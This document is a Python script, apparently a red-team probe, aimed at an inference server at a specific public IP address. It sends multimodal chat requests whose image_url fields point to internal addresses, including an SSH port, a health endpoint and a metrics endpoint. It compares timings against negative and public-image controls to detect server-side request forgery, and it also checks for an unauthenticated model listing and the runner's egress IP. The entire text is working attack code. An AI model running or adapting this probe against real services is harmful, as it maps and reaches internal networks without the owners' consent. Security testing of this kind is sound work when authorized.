import json, time, urllib.request, urllib.error
B = "http://123.184.7.135:8000"

def req(path, data=None, timeout=40):
    body = json.dumps(data).encode() if data is not None else None
    r = urllib.request.Request(B + path, data=body, method="POST" if data is not None else "GET")
    if body:
        r.add_header("Content-Type", "application/json")
    t0 = time.time()
    try:
        with urllib.request.urlopen(r, timeout=timeout) as x:
            b = x.read(4000)
            return x.status, b.decode("utf-8", "replace"), round(time.time() - t0, 2)
    except urllib.error.HTTPError as e:
        b = e.read(4000)
        return e.code, b.decode("utf-8", "replace"), round(time.time() - t0, 2)
    except Exception as e:
        return "ERR", repr(e), round(time.time() - t0, 2)

def mm(u):
    return {"model": "m", "messages": [{"role": "user", "content": [
        {"type": "text", "text": "hi"},
        {"type": "image_url", "image_url": {"url": u}}]}], "max_tokens": 1}

def show(tag, res):
    st, body, dt = res
    print(f"{tag} -> status={st} t={dt}s body={body[:900]!r}")
    print()

print("RT758 START", time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()))
show("A GET /version", req("/version"))
show("B GET /v1/models (auth control)", req("/v1/models"))
show("C1 POST /invocations image_url=http://192.168.0.31:22", req("/invocations", mm("http://192.168.0.31:22")))
show("C2 POST /invocations image_url=http://192.168.0.31:22 (repeat)", req("/invocations", mm("http://192.168.0.31:22")))
show("D POST /invocations image_url=http://192.168.0.24:18086/health", req("/invocations", mm("http://192.168.0.24:18086/health")))
show("E POST /invocations image_url=http://192.168.0.31:9400/metrics", req("/invocations", mm("http://192.168.0.31:9400/metrics")))
show("F NEG image_url=http://192.168.0.1:80/", req("/invocations", mm("http://192.168.0.1:80/")))
show("G NEG image_url=http://10.255.255.1:80/", req("/invocations", mm("http://10.255.255.1:80/")))
show("H CTRL public png", req("/invocations", mm("https://upload.wikimedia.org/wikipedia/commons/thumb/4/47/PNG_transparency_demonstration_1.png/280px-PNG_transparency_demonstration_1.png")))
show("J FUNC text-only chat on /invocations", req("/invocations", {"model": "qwen3.8-27b", "messages": [{"role": "user", "content": "hi"}], "max_tokens": 2}))
try:
    with urllib.request.urlopen("https://api.ipify.org", timeout=15) as x:
        print("runner egress ip:", x.read().decode())
except Exception as e:
    print("ipify err", repr(e))
print("RT758 END", time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()))
